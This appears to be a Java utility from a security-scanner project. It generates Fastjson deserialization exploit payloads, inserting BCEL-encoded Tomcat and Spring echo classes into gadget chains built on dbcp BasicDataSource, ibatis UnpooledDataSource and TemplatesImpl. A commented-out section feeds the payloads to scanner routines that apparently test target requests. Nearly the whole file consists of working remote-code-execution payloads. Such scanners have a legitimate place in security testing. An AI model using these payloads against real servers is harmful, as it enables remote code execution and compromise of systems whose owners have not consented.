package cn.safe6.util;

public class BCELPayload {

    public static void main(String[] args) {
        String echoPayload=null;
        String BCELCodeTE=null;
        String BCELCodeTE1=null;
        //java.net.URL
        //java.net.Inet4Address
        //com.sun.rowset.JdbcRowSetImpl
        //com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl



        //检测1.2.47 TomcatEcho
        try {
            BCELCodeTE = BCELEncode.class2BCEL("TomcatEcho.class");
            BCELCodeTE1 = BCELEncode.class2BCEL("Spring.class");
        }catch (Exception e){
            //stdout.println(e.getMessage());
        }

        //dbcp的TomcatEcho 第1种
        echoPayload="{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"{BCELCodeTE}\"}\n" +
                "    }: \"x\"\n" +
                "}";
        System.out.println(echoPayload.replace("{BCELCodeTE}",BCELCodeTE));
       echoPayload="{ \"a\": {\"@type\": \"java.lang.Class\",\"val\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"b\": {\"@type\": \"java.lang.Class\",\"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"c\": {\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"{BCELCodeTE}\"}}";
        System.out.println(echoPayload.replace("{BCELCodeTE}",BCELCodeTE));

       echoPayload="{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"{BCELCodeTE}\"}";
        System.out.println(echoPayload.replace("{BCELCodeTE}",BCELCodeTE));
       echoPayload="{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"{BCELCodeTE}\"}";
        System.out.println(echoPayload.replace("{BCELCodeTE}",BCELCodeTE));
        echoPayload="{\"x\":{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeTE}\"}}:\"a\"}}";
        System.out.println(echoPayload.replace("{BCELCodeTE}",BCELCodeTE));
        echoPayload="{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeTE}\"}}:\"a\"}";
        System.out.println(echoPayload.replace("{BCELCodeTE}",BCELCodeTE));
        echoPayload="{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeTE}\"}}";

        System.out.println(echoPayload.replace("{BCELCodeTE}",BCELCodeTE));

        System.out.println("-------------------\r\n\r\n\r\n");
        echoPayload="{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"{BCELCodeSE}\"}\n" +
                "    }: \"x\"\n" +
                "}";
        System.out.println(echoPayload.replace("{BCELCodeSE}",BCELCodeTE1));
        echoPayload="{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeSE}\"}}";
        System.out.println(echoPayload.replace("{BCELCodeSE}",BCELCodeTE1));
        echoPayload="{ \"a\": {\"@type\": \"java.lang.Class\",\"val\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"b\": {\"@type\": \"java.lang.Class\",\"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"c\": {\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"{BCELCodeSE}\"}}";
        System.out.println(echoPayload.replace("{BCELCodeSE}",BCELCodeTE1));
        echoPayload="{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"{BCELCodeSE}\"}";
        System.out.println(echoPayload.replace("{BCELCodeSE}",BCELCodeTE1));
        echoPayload="{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"{BCELCodeSE}\"}";
        System.out.println(echoPayload.replace("{BCELCodeSE}",BCELCodeTE1));
        echoPayload="{\"x\":{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeSE}\"}}:\"a\"}}";
        System.out.println(echoPayload.replace("{BCELCodeSE}",BCELCodeTE1));
        echoPayload="{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeSE}\"}}:\"a\"}";
        System.out.println(echoPayload.replace("{BCELCodeSE}",BCELCodeTE1));

        String jsonString = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_name\":\"goodjob\",\"_tfactory\":{}," +
                "\"_bytecodes\":[\"xxx\"]," +
                "\"_outputProperties\":null}";

        System.out.println(jsonString);

/*


        //dbcp的TomcatEcho 第2种exp
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeTE}",BCELCodeTE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //dbcp的TomcatEcho 第3种exp
        echoPayload="{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"{BCELCodeTE}\"}";
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeTE}",BCELCodeTE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //dbcp的TomcatEcho 第4种exp
        echoPayload="{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"{BCELCodeTE}\"}";
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeTE}",BCELCodeTE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //ibatis的TomcatEcho 第1种
        echoPayload="{\"x\":{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeTE}\"}}:\"a\"}}";
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeTE}",BCELCodeTE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //ibatis的TomcatEcho 第2种
        echoPayload="{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeTE}\"}}:\"a\"}";
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeTE}",BCELCodeTE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //ibatis的TomcatEcho 第3种
        echoPayload="{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"{BCELCodeTE}\"}}";
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeTE}",BCELCodeTE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }


        //dbcp的SpringEcho
        String  BCELCodeSE=null;
        try {
            BCELCodeSE = BCELEncode.class2BCEL("SpringEcho.class");
            //stdout.println(echoPayload);
            echoPayload="{\n" +
                    "    {\n" +
                    "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                    "        \"x\":{\n" +
                    "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                    "                \"driverClassLoader\": {\n" +
                    "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "                },\n" +
                    "                \"driverClassName\":\"{BCELCodeSE}\"}\n" +
                    "    }: \"x\"\n" +
                    "}";
        } catch (Exception e) {
            stdout.println(e.getMessage());
        }
        issue = ScanFastjson24echo1(baseRequestResponse,echoPayload.replace("{BCELCodeSE}",BCELCodeSE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //dbcp的SpringEcho 第2种exp


        issue = ScanFastjson24echo1(baseRequestResponse,echoPayload.replace("{BCELCodeSE}",BCELCodeSE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //dbcp的SpringEcho 第3种exp

        issue = ScanFastjson24echo1(baseRequestResponse,echoPayload.replace("{BCELCodeSE}",BCELCodeSE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //dbcp的SpringEcho 第4种exp

        issue = ScanFastjson24echo1(baseRequestResponse,echoPayload.replace("{BCELCodeSE}",BCELCodeSE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //ibatis的SpringEcho 第1种

        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeSE}",BCELCodeSE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //ibatis的SpringEcho 第2种


        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeSE}",BCELCodeSE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }

        //ibatis的SpringEcho 第3种
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload.replace("{BCELCodeSE}",BCELCodeSE),echoPayload);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }


        //Templates的TomcatEcho
        try {
            echoPayload = buildPayload();
        } catch (Exception e) {
            stdout.println(e.getMessage());
        }
        //TomcatEcho
        issue = ScanFastjson24echo(baseRequestResponse,echoPayload,null);
        if (issue != null) {
            issues.add(issue);
            return issues;
        }*/
    }
}
